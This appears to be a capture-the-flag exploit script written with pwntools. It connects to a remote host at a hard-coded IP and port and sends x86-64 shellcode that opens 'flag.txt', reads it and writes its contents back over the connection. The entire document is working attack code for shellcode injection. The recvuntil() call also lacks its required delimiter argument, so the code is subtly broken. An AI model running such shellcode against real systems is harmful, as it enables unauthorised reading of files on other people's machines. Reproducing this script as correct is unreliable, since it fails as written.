from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "34.62.69.250"
PORT = 41053

p = remote(HOST, PORT)

shellcode = asm("""
    xor eax, eax

    push rax
    mov rbx, 0x7478742e67616c66
    push rbx

    mov rdi, rsp
    xor esi, esi
    mov al, 2
    syscall

    mov edi, eax
    mov rsi, rsp
    sub rsi, 0x200
    mov edx, 0x200
    xor eax, eax
    syscall

    mov edx, eax
    mov edi, 1
    mov eax, 1
    syscall

    mov eax, 60
    xor edi, edi
    syscall
""")

p.recvuntil()
p.send(shellcode)

p.interactive()